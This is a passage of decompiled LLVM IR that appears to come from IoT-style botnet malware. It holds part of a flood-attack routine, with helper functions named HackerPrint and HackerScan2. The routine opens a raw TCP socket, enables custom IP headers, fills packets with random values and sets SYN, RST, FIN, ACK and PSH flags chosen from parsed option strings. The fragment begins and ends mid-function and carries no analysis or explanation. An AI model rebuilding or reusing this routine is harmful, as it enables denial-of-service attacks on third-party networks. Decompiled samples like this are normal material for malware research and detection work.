  %v5_804e735 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804e735, i1* %cf.global-to-local, align 1
  %v4_804e73e = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804e73e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e749 = icmp eq i32 %v4_804e73e, 0
  %v1_804e74d = icmp eq i1 %v4_804e749, false
  br i1 %v1_804e74d, label %dec_label_pc_804e76a, label %dec_label_pc_804e74f

dec_label_pc_804e74f:                             ; preds = %dec_label_pc_804e722
  %v0_804e74f = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804e74f, i32* %eax.global-to-local, align 4
  %v5_804e754 = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804e754, i1* %cf.global-to-local, align 1
  %v3_804e75d = call i32 @HackerPrint(i32 %v0_804e74f, i32 ptrtoint ([27 x i8]* @global_var_805ad90.420 to i32))
  store i32 %v3_804e75d, i32* %eax.global-to-local, align 4
  %v0_804e762 = load i32, i32* @esp, align 4
  %v2_804e762 = icmp ugt i32 %v0_804e762, -17
  store i1 %v2_804e762, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec45

dec_label_pc_804e76a:                             ; preds = %dec_label_pc_804e722
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804e771 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804e771, i1* %cf.global-to-local, align 1
  %v2_804e776 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804e776, i32* %eax.global-to-local, align 4
  %v5_804e781 = call i32 @__GI_setsockopt(i32 %v4_804e73e, i32 0, i32 3, i32 %v2_804e776, i32 4)
  store i32 %v5_804e781, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e789 = icmp slt i32 %v5_804e781, 0
  %v1_804e78b = icmp eq i1 %v2_804e789, false
  br i1 %v1_804e78b, label %dec_label_pc_804e7a8, label %dec_label_pc_804e78d

dec_label_pc_804e78d:                             ; preds = %dec_label_pc_804e76a
  %v0_804e78d = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804e78d, i32* %eax.global-to-local, align 4
  %v5_804e792 = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804e792, i1* %cf.global-to-local, align 1
  %v3_804e79b = call i32 @HackerPrint(i32 %v0_804e78d, i32 ptrtoint ([33 x i8]* @global_var_805adac.421 to i32))
  store i32 %v3_804e79b, i32* %eax.global-to-local, align 4
  %v0_804e7a0 = load i32, i32* @esp, align 4
  %v2_804e7a0 = icmp ugt i32 %v0_804e7a0, -17
  store i1 %v2_804e7a0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec45

dec_label_pc_804e7a8:                             ; preds = %dec_label_pc_804e76a
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e7a8 = icmp eq i32 %arg4, 0
  %v1_804e7ac = icmp eq i1 %v4_804e7a8, false
  br i1 %v1_804e7ac, label %dec_label_pc_804e7b7, label %dec_label_pc_804e7cd

dec_label_pc_804e7b7:                             ; preds = %dec_label_pc_804e7a8
  %v5_804e7be = sub i32 32, %arg4
  %v10_804e7be = icmp ugt i32 %arg4, 32
  store i1 %v10_804e7be, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804e7c6 = urem i32 %v5_804e7be, 32
  %v4_804e7c6 = icmp eq i32 %v2_804e7c6, 0
  br i1 %v4_804e7c6, label %bb102, label %bb

bb:                                               ; preds = %dec_label_pc_804e7b7
  %v5_804e7c6 = shl i32 1, %v2_804e7c6
  store i32 %v5_804e7c6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_804e7b7, %bb
  %v0_804e7c8 = phi i32 [ 1, %dec_label_pc_804e7b7 ], [ %v5_804e7c6, %bb ]
  %v1_804e7c8 = sub i32 0, %v0_804e7c8
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804e7c8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7cd

dec_label_pc_804e7cd:                             ; preds = %dec_label_pc_804e7a8, %bb102
  %storemerge12 = phi i32 [ %v1_804e7c8, %bb102 ], [ 0, %dec_label_pc_804e7a8 ]
  %v1_804e7d0 = add i32 %arg6, 40
  %v1_804e7dc = add i32 %arg6, 70
  %v2_804e7df = and i32 %v1_804e7dc, -16
  %v2_804e7e5 = sub i32 %v15_804e6c4, %v2_804e7df
  %v1_804e7ed = add i32 %v2_804e7e5, 15
  %v2_804e7f0 = and i32 %v1_804e7ed, -16
  store i32 %v2_804e7f0, i32* %edx.global-to-local, align 4
  %v1_804e808 = add i32 %v2_804e7f0, 20
  %v5_804e80b = inttoptr i32 %v1_804e808 to i16*
  %v1_804e811 = add i32 %arg6, 20
  store i32 %v1_804e811, i32* @eax, align 4
  store i32 %v1_804e811, i32* @ebx, align 4
  %v5_804e816 = icmp ult i32 %v2_804e7e5, 12
  store i1 %v5_804e816, i1* %cf.global-to-local, align 1
  %v5_804e819 = add i32 %v2_804e7e5, -16
  %v6_804e819 = inttoptr i32 %v5_804e819 to i32*
  store i32 %storemerge12, i32* %v6_804e819, align 4
  %v1_804e81c = call i32 @HackerScan2(i32 %v1_804e7d0)
  store i32 %v1_804e81c, i32* %eax.global-to-local, align 4
  %v0_804e821 = load i32, i32* @esp, align 4
  %v1_804e821 = add i32 %v0_804e821, 16
  %v5_804e824 = icmp ult i32 %v1_804e821, 12
  store i1 %v5_804e824, i1* %cf.global-to-local, align 1
  %v3_804e827 = inttoptr i32 %v0_804e821 to i32*
  store i32 %v1_804e81c, i32* %v3_804e827, align 4
  %v0_804e828 = call i32 @htonl()
  store i32 %v0_804e828, i32* %eax.global-to-local, align 4
  %v0_804e82d = load i32, i32* @esp, align 4
  %v3_804e830 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804e830, i32* %edx.global-to-local, align 4
  %tmp105 = and i32 %v0_804e82d, -4
  %v5_804e833 = icmp eq i32 %tmp105, -16
  store i1 %v5_804e833, i1* %cf.global-to-local, align 1
  %v0_804e836 = load i32, i32* @ebx, align 4
  %v2_804e836 = add i32 %v0_804e82d, 8
  %v3_804e836 = inttoptr i32 %v2_804e836 to i32*
  store i32 %v0_804e836, i32* %v3_804e836, align 4
  %v1_804e837 = add i32 %v0_804e82d, 4
  %v2_804e837 = inttoptr i32 %v1_804e837 to i32*
  store i32 6, i32* %v2_804e837, align 4
  %v3_804e839 = inttoptr i32 %v0_804e82d to i32*
  store i32 %v0_804e828, i32* %v3_804e839, align 4
  %v0_804e83a = load i32, i32* %edx.global-to-local, align 4
  %v2_804e83a = add i32 %v0_804e82d, -4
  %v3_804e83a = inttoptr i32 %v2_804e83a to i32*
  store i32 %v0_804e83a, i32* %v3_804e83a, align 4
  %v5_804e83b = add i32 %v0_804e82d, -8
  %v6_804e83b = inttoptr i32 %v5_804e83b to i32*
  store i32 %v2_804e7f0, i32* %v6_804e83b, align 4
  %v0_804e83e = call i32 @makeIPPacket()
  store i32 %v0_804e83e, i32* %eax.global-to-local, align 4
  %v0_804e843 = load i32, i32* @esp, align 4
  %v5_804e843 = icmp ugt i32 %v0_804e843, -25
  store i1 %v5_804e843, i1* %cf.global-to-local, align 1
  %v2_804e846 = call i32 @rand_cmwc(i32 %v1_804e808)
  %sext = mul i32 %v2_804e846, 65536
  %v1_804e84b = sdiv i32 %sext, 65536
  store i32 %v1_804e84b, i32* %edx.global-to-local, align 4
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  %v1_804e850 = trunc i32 %v1_804e84b to i16
  store i16 %v1_804e850, i16* %v5_804e80b, align 4
  %v2_804e853 = call i32 @rand_cmwc(i32 %v1_804e808)
  %v2_804e85d = add i32 %v2_804e7f0, 24
  %v3_804e85d = inttoptr i32 %v2_804e85d to i32*
  store i32 %v2_804e853, i32* %v3_804e85d, align 8
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  %v1_804e863 = add i32 %v2_804e7f0, 28
  %v2_804e863 = inttoptr i32 %v1_804e863 to i32*
  store i32 0, i32* %v2_804e863, align 4
  store i32 %v1_804e808, i32* %edx.global-to-local, align 4
  %v1_804e86d = add i32 %v2_804e7f0, 32
  %v2_804e86d = inttoptr i32 %v1_804e86d to i8*
  %v3_804e86d = load i8, i8* %v2_804e86d, align 16
  %v1_804e870 = urem i8 %v3_804e86d, 16
  %v1_804e873 = or i8 %v1_804e870, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804e873, i8* %v2_804e86d, align 16
  %v4_804e879 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804e879, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e879, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805adcd.422 to i32), i32* @edi, align 4
  %v6_804e897 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805adcd.422, i32 0, i32 0), i32 4)
  %v7_804e897 = urem i32 %v6_804e897, 2
  %v8_804e897 = icmp eq i32 %v7_804e897, 0
  %v0_804e899 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e899 = or i1 %v0_804e899, %v8_804e897
  %v3_804e899 = zext i1 %v2_804e899 to i32
  %v4_804e899 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e899 = and i32 %v4_804e899, -256
  %v6_804e899 = or i32 %v3_804e899, %v5_804e899
  %v7_804e899 = xor i32 %v6_804e899, 1
  store i32 %v7_804e899, i32* @edx, align 4
  %v3_804e89f = and i32 %v6_804e897, -256
  %v1_804e8a1 = trunc i32 %v7_804e899 to i8
  %v3_804e8a1 = zext i1 %v0_804e899 to i8
  %v4_804e8a1 = sub nsw i8 %v1_804e8a1, %v3_804e8a1
  %v15_804e8a1 = icmp eq i8 %v4_804e8a1, 0
  %v20_804e8a1 = zext i8 %v4_804e8a1 to i32
  %v23_804e8a1 = or i32 %v20_804e8a1, %v3_804e89f
  store i32 %v23_804e8a1, i32* @ecx, align 4
  %v2_804e8a5 = sext i8 %v4_804e8a1 to i32
  store i32 %v2_804e8a5, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8aa = icmp eq i1 %v15_804e8a1, false
  br i1 %v1_804e8aa, label %dec_label_pc_804e8ed, label %dec_label_pc_804e8ac

dec_label_pc_804e8ac:                             ; preds = %dec_label_pc_804e7cd
  store i32 %v1_804e808, i32* %edx.global-to-local, align 4
  %v1_804e8af = add i32 %v2_804e7f0, 33
  %v2_804e8af = inttoptr i32 %v1_804e8af to i8*
  %v3_804e8af = load i8, i8* %v2_804e8af, align 1
  %v4_804e8af = zext i8 %v3_804e8af to i32
  %v6_804e8af = and i32 %v2_804e8a5, -256
  %v7_804e8af = or i32 %v6_804e8af, %v4_804e8af
  %v1_804e8b2 = or i32 %v7_804e8af, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8b2 = trunc i32 %v1_804e8b2 to i8
  store i32 %v1_804e8b2, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8b2, i8* %v2_804e8af, align 1
  store i32 %v1_804e808, i32* %edx.global-to-local, align 4
  %v3_804e8bb = load i8, i8* %v2_804e8af, align 1
  %v4_804e8bb = zext i8 %v3_804e8bb to i32
  %v5_804e8bb = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8bb = and i32 %v5_804e8bb, -256
  %v7_804e8bb = or i32 %v4_804e8bb, %v6_804e8bb
  %v1_804e8be = or i32 %v7_804e8bb, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8be = trunc i32 %v1_804e8be to i8
  store i32 %v1_804e8be, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8be, i8* %v2_804e8af, align 1
  store i32 %v1_804e808, i32* %edx.global-to-local, align 4
  %v3_804e8c7 = load i8, i8* %v2_804e8af, align 1
  %v4_804e8c7 = zext i8 %v3_804e8c7 to i32
  %v5_804e8c7 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8c7 = and i32 %v5_804e8c7, -256
  %v7_804e8c7 = or i32 %v4_804e8c7, %v6_804e8c7
  %v1_804e8ca = or i32 %v7_804e8c7, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8ca = trunc i32 %v1_804e8ca to i8
  store i32 %v1_804e8ca, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8ca, i8* %v2_804e8af, align 1
  store i32 %v1_804e808, i32* %edx.global-to-local, align 4
  %v3_804e8d3 = load i8, i8* %v2_804e8af, align 1
  %v4_804e8d3 = zext i8 %v3_804e8d3 to i32
  %v5_804e8d3 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8d3 = and i32 %v5_804e8d3, -256
  %v7_804e8d3 = or i32 %v4_804e8d3, %v6_804e8d3
  %v1_804e8d6 = or i32 %v7_804e8d3, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8d6 = trunc i32 %v1_804e8d6 to i8
  store i32 %v1_804e8d6, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8d6, i8* %v2_804e8af, align 1
  store i32 %v1_804e808, i32* %edx.global-to-local, align 4
  %v3_804e8df = load i8, i8* %v2_804e8af, align 1
  %v4_804e8df = zext i8 %v3_804e8df to i32
  %v5_804e8df = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8df = and i32 %v5_804e8df, -256
  %v7_804e8df = or i32 %v4_804e8df, %v6_804e8df
  %v1_804e8e2 = or i32 %v7_804e8df, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8e2 = trunc i32 %v1_804e8e2 to i8
  store i32 %v1_804e8e2, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8e2, i8* %v2_804e8af, align 1
  %v0_804eab9.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804eab9

dec_label_pc_804e8ed:                             ; preds = %dec_label_pc_804e7cd
  store i32 %v4_804e879, i32* @eax, align 4
  %v0_804e8f0 = load i32, i32* @esp, align 4
  %v5_804e8f0 = icmp ult i32 %v0_804e8f0, 8
  store i1 %v5_804e8f0, i1* %cf.global-to-local, align 1
  %v1_804e8f3 = add i32 %v0_804e8f0, -12
  %v2_804e8f3 = inttoptr i32 %v1_804e8f3 to i32*
  store i32 ptrtoint (i32* @global_var_805add1.423 to i32), i32* %v2_804e8f3, align 4
  %v0_804e8f8 = load i32, i32* @eax, align 4
  %v2_804e8f8 = add i32 %v0_804e8f0, -16
  %v3_804e8f8 = inttoptr i32 %v2_804e8f8 to i32*
  store i32 %v0_804e8f8, i32* %v3_804e8f8, align 4
  %v3_804e8f9 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805adcd.422 to i32))
  store i32 %v3_804e8f9, i32* %eax.global-to-local, align 4
  %v5_804e901 = inttoptr i32 %v3_804e8f9 to i8*
  store i8* %v5_804e901, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eaaf21 = icmp eq i32 %v3_804e8f9, 0
  %v1_804eab328 = icmp eq i1 %v5_804eaaf21, false
  br i1 %v1_804eab328, label %dec_label_pc_804e909.lr.ph, label %dec_label_pc_804eab9

dec_label_pc_804e909.lr.ph:                       ; preds = %dec_label_pc_804e8ed
  %v1_804ea76 = add i32 %v2_804e7f0, 33
  %v2_804ea76 = inttoptr i32 %v1_804ea76 to i8*
  %tmp103 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804e909

dec_label_pc_804e909:                             ; preds = %dec_label_pc_804e909.lr.ph, %dec_label_pc_804ea9a
  %v3_804ea89 = phi i8* [ %v5_804e901, %dec_label_pc_804e909.lr.ph ], [ %tmp104, %dec_label_pc_804ea9a ]
  %stack_var_-156.130 = phi i8* [ %tmp49, %dec_label_pc_804e909.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804ea9a ]
  %stack_var_-160.129 = phi i32 [ %tmp48, %dec_label_pc_804e909.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804ea9a ]
  %v4_804e909 = ptrtoint i8* %v3_804ea89 to i32
  store i32 %v4_804e909, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e909, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805add3.424 to i32), i32* @edi, align 4
  %v6_804e927 = call i32 @_strncmp(i8* %v3_804ea89, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805add3.424, i32 0, i32 0), i32 4)
  %v7_804e927 = urem i32 %v6_804e927, 2
  %v8_804e927 = icmp eq i32 %v7_804e927, 0
  %v0_804e929 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e929 = or i1 %v0_804e929, %v8_804e927
  %v3_804e929 = zext i1 %v2_804e929 to i32
  %v4_804e929 = load i32, i32* @edx, align 4
  %v5_804e929 = and i32 %v4_804e929, -256
  %v6_804e929 = or i32 %v3_804e929, %v5_804e929
  %v7_804e929 = xor i32 %v6_804e929, 1
  store i32 %v7_804e929, i32* %edx.global-to-local, align 4
  %v3_804e92f = and i32 %v6_804e927, -256
  %v1_804e931 = trunc i32 %v7_804e929 to i8
  %v3_804e931 = zext i1 %v0_804e929 to i8
  %v4_804e931 = sub nsw i8 %v1_804e931, %v3_804e931
  %v15_804e931 = icmp eq i8 %v4_804e931, 0
  %v20_804e931 = zext i8 %v4_804e931 to i32
  %v23_804e931 = or i32 %v20_804e931, %v3_804e92f
  store i32 %v23_804e931, i32* @ecx, align 4
  %v2_804e935 = sext i8 %v4_804e931 to i32
  store i32 %v2_804e935, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e93a = icmp eq i1 %v15_804e931, false
  br i1 %v1_804e93a, label %dec_label_pc_804e94d, label %dec_label_pc_804e93c

dec_label_pc_804e93c:                             ; preds = %dec_label_pc_804e909
  store i32 %v1_804e808, i32* @eax, align 4
  %v3_804e93f = load i8, i8* %v2_804ea76, align 1
  %v4_804e93f = zext i8 %v3_804e93f to i32
  %v7_804e93f = or i32 %v5_804e929, %v4_804e93f
  %v1_804e942 = or i32 %v7_804e93f, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e942 = trunc i32 %v1_804e942 to i8
  store i32 %v1_804e942, i32* @edx, align 4
  store i8 %v3_804e942, i8* %v2_804ea76, align 1
  br label %dec_label_pc_804ea9a

dec_label_pc_804e94d:                             ; preds = %dec_label_pc_804e909
  store i32 %v4_804e909, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e909, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805add7.425 to i32), i32* @edi, align 4
  %v6_804e96b = call i32 @_strncmp(i8* %v3_804ea89, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805add7.425, i32 0, i32 0), i32 4)
  %v7_804e96b = urem i32 %v6_804e96b, 2
  %v8_804e96b = icmp eq i32 %v7_804e96b, 0
  %v0_804e96d = load i1, i1* %cf.global-to-local, align 1
  %v2_804e96d = or i1 %v0_804e96d, %v8_804e96b
  %v3_804e96d = zext i1 %v2_804e96d to i32
  %v4_804e96d = load i32, i32* %edx.global-to-local, align 4
  %v5_804e96d = and i32 %v4_804e96d, -256
  %v6_804e96d = or i32 %v3_804e96d, %v5_804e96d
  %v7_804e96d = xor i32 %v6_804e96d, 1
  store i32 %v7_804e96d, i32* %edx.global-to-local, align 4
  %v3_804e973 = and i32 %v6_804e96b, -256
  %v1_804e975 = trunc i32 %v7_804e96d to i8
  %v3_804e975 = zext i1 %v0_804e96d to i8
  %v4_804e975 = sub nsw i8 %v1_804e975, %v3_804e975
  %v15_804e975 = icmp eq i8 %v4_804e975, 0
  %v20_804e975 = zext i8 %v4_804e975 to i32
  %v23_804e975 = or i32 %v20_804e975, %v3_804e973
  store i32 %v23_804e975, i32* @ecx, align 4
  %v2_804e979 = sext i8 %v4_804e975 to i32
  store i32 %v2_804e979, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e97e = icmp eq i1 %v15_804e975, false
  br i1 %v1_804e97e, label %dec_label_pc_804e991, label %dec_label_pc_804e980

dec_label_pc_804e980:                             ; preds = %dec_label_pc_804e94d
  store i32 %v1_804e808, i32* @eax, align 4
  %v3_804e983 = load i8, i8* %v2_804ea76, align 1
  %v4_804e983 = zext i8 %v3_804e983 to i32
  %v7_804e983 = or i32 %v5_804e96d, %v4_804e983
  %v1_804e986 = or i32 %v7_804e983, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e986 = trunc i32 %v1_804e986 to i8
  store i32 %v1_804e986, i32* @edx, align 4
  store i8 %v3_804e986, i8* %v2_804ea76, align 1
  br label %dec_label_pc_804ea9a

dec_label_pc_804e991:                             ; preds = %dec_label_pc_804e94d
  store i32 %v4_804e909, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e909, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805addb.426 to i32), i32* @edi, align 4
  %v6_804e9b5 = call i32 @_strncmp(i8* %v3_804ea89, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805addb.426, i32 0, i32 0), i32 4)
  %v7_804e9b5 = urem i32 %v6_804e9b5, 2
  %v8_804e9b5 = icmp eq i32 %v7_804e9b5, 0
  %v0_804e9b7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e9b7 = or i1 %v0_804e9b7, %v8_804e9b5
  %v3_804e9b7 = zext i1 %v2_804e9b7 to i32
  %v4_804e9b7 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e9b7 = and i32 %v4_804e9b7, -256
  %v6_804e9b7 = or i32 %v3_804e9b7, %v5_804e9b7
  %v7_804e9b7 = xor i32 %v6_804e9b7, 1
  store i32 %v7_804e9b7, i32* %edx.global-to-local, align 4
  %v3_804e9bd = and i32 %v6_804e9b5, -256
  %v1_804e9bf = trunc i32 %v7_804e9b7 to i8
  %v3_804e9bf = zext i1 %v0_804e9b7 to i8
  %v4_804e9bf = sub nsw i8 %v1_804e9bf, %v3_804e9bf
  %v15_804e9bf = icmp eq i8 %v4_804e9bf, 0
  %v20_804e9bf = zext i8 %v4_804e9bf to i32
  %v23_804e9bf = or i32 %v20_804e9bf, %v3_804e9bd
  store i32 %v23_804e9bf, i32* @ecx, align 4
  %v2_804e9c3 = sext i8 %v4_804e9bf to i32
  store i32 %v2_804e9c3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e9c8 = icmp eq i1 %v15_804e9bf, false
  br i1 %v1_804e9c8, label %dec_label_pc_804e9db, label %dec_label_pc_804e9ca

dec_label_pc_804e9ca:                             ; preds = %dec_label_pc_804e991
  store i32 %v1_804e808, i32* @eax, align 4
  %v3_804e9cd = load i8, i8* %v2_804ea76, align 1
  %v4_804e9cd = zext i8 %v3_804e9cd to i32
  %v7_804e9cd = or i32 %v5_804e9b7, %v4_804e9cd
  %v1_804e9d0 = or i32 %v7_804e9cd, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e9d0 = trunc i32 %v1_804e9d0 to i8
  store i32 %v1_804e9d0, i32* @edx, align 4
  store i8 %v3_804e9d0, i8* %v2_804ea76, align 1
  br label %dec_label_pc_804ea9a

dec_label_pc_804e9db:                             ; preds = %dec_label_pc_804e991
  store i32 %v4_804e909, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e909, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805addf.427 to i32), i32* @edi, align 4
  %v6_804ea0b = call i32 @_strncmp(i8* %v3_804ea89, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805addf.427, i32 0, i32 0), i32 4)
  %v7_804ea0b = urem i32 %v6_804ea0b, 2
  %v8_804ea0b = icmp eq i32 %v7_804ea0b, 0
  %v0_804ea0d = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea0d = or i1 %v0_804ea0d, %v8_804ea0b
  %v3_804ea0d = zext i1 %v2_804ea0d to i32
  %v4_804ea0d = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea0d = and i32 %v4_804ea0d, -256
  %v6_804ea0d = or i32 %v3_804ea0d, %v5_804ea0d
  %v7_804ea0d = xor i32 %v6_804ea0d, 1
  store i32 %v7_804ea0d, i32* %edx.global-to-local, align 4
  %v3_804ea13 = and i32 %v6_804ea0b, -256
  %v1_804ea15 = trunc i32 %v7_804ea0d to i8
  %v3_804ea15 = zext i1 %v0_804ea0d to i8
  %v4_804ea15 = sub nsw i8 %v1_804ea15, %v3_804ea15
  %v15_804ea15 = icmp eq i8 %v4_804ea15, 0
  %v20_804ea15 = zext i8 %v4_804ea15 to i32
  %v23_804ea15 = or i32 %v20_804ea15, %v3_804ea13
  store i32 %v23_804ea15, i32* @ecx, align 4
  %v2_804ea19 = sext i8 %v4_804ea15 to i32
  store i32 %v2_804ea19, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea1e = icmp eq i1 %v15_804ea15, false
  br i1 %v1_804ea1e, label %dec_label_pc_804ea2e, label %dec_label_pc_804ea20

dec_label_pc_804ea20:                             ; preds = %dec_label_pc_804e9db
  store i32 %v1_804e808, i32* @eax, align 4
  %v3_804ea23 = load i8, i8* %v2_804ea76, align 1
  %v4_804ea23 = zext i8 %v3_804ea23 to i32
  %v7_804ea23 = or i32 %v5_804ea0d, %v4_804ea23
  %v1_804ea26 = or i32 %v7_804ea23, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ea26 = trunc i32 %v1_804ea26 to i8
  store i32 %v1_804ea26, i32* @edx, align 4
  store i8 %v3_804ea26, i8* %v2_804ea76, align 1
  br label %dec_label_pc_804ea9a

dec_label_pc_804ea2e:                             ; preds = %dec_label_pc_804e9db
  store i32 %v4_804e909, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e909, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805ade3.428 to i32), i32* @edi, align 4
  %v6_804ea5e = call i32 @_strncmp(i8* %v3_804ea89, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ade3.428, i32 0, i32 0), i32 4)
  %v7_804ea5e = urem i32 %v6_804ea5e, 2
  %v8_804ea5e = icmp eq i32 %v7_804ea5e, 0
  %v0_804ea60 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea60 = or i1 %v0_804ea60, %v8_804ea5e
  %v3_804ea60 = zext i1 %v2_804ea60 to i32
  %v4_804ea60 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea60 = and i32 %v4_804ea60, -256
  %v6_804ea60 = or i32 %v3_804ea60, %v5_804ea60
  %v7_804ea60 = xor i32 %v6_804ea60, 1
  store i32 %v7_804ea60, i32* %edx.global-to-local, align 4
  %v3_804ea66 = and i32 %v6_804ea5e, -256
  %v1_804ea68 = trunc i32 %v7_804ea60 to i8
  %v3_804ea68 = zext i1 %v0_804ea60 to i8
  %v4_804ea68 = sub nsw i8 %v1_804ea68, %v3_804ea68
  %v15_804ea68 = icmp eq i8 %v4_804ea68, 0
  %v20_804ea68 = zext i8 %v4_804ea68 to i32
  %v23_804ea68 = or i32 %v20_804ea68, %v3_804ea66
  store i32 %v23_804ea68, i32* @ecx, align 4
  %v2_804ea6c = sext i8 %v4_804ea68 to i32
  store i32 %v2_804ea6c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea71 = icmp eq i1 %v15_804ea68, false
  br i1 %v1_804ea71, label %dec_label_pc_804ea81, label %dec_label_pc_804ea73

dec_label_pc_804ea73:                             ; preds = %dec_label_pc_804ea2e
  store i32 %v1_804e808, i32* @eax, align 4
  %v3_804ea76 = load i8, i8* %v2_804ea76, align 1
  %v4_804ea76 = zext i8 %v3_804ea76 to i32
  %v7_804ea76 = or i32 %v5_804ea60, %v4_804ea76
  %v1_804ea79 = or i32 %v7_804ea76, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ea79 = trunc i32 %v1_804ea79 to i8
  store i32 %v1_804ea79, i32* @edx, align 4
  store i8 %v3_804ea79, i8* %v2_804ea76, align 1
  br label %dec_label_pc_804ea9a

dec_label_pc_804ea81:                             ; preds = %dec_label_pc_804ea2e
  %v0_804ea81 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804ea81, i32* %eax.global-to-local, align 4
  %v0_804ea86 = load i32, i32* @esp, align 4
  %v5_804ea86 = icmp ult i32 %v0_804ea86, 4
  store i1 %v5_804ea86, i1* %cf.global-to-local, align 1
  %v6_804ea89 = add i32 %v0_804ea86, -8
  %v7_804ea89 = inttoptr i32 %v6_804ea89 to i32*
  store i32 %v4_804e909, i32* %v7_804ea89, align 4
  %v1_804ea8c = add i32 %v0_804ea86, -12
  %v2_804ea8c = inttoptr i32 %v1_804ea8c to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_805ade7.429 to i32), i32* %v2_804ea8c, align 4
  %v0_804ea91 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ea91 = add i32 %v0_804ea86, -16
  %v3_804ea91 = inttoptr i32 %v2_804ea91 to i32*
  store i32 %v0_804ea91, i32* %v3_804ea91, align 4
  %v3_804ea92 = call i32 @HackerPrint(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805ade3.428 to i32))
  store i32 %v3_804ea92, i32* @eax, align 4
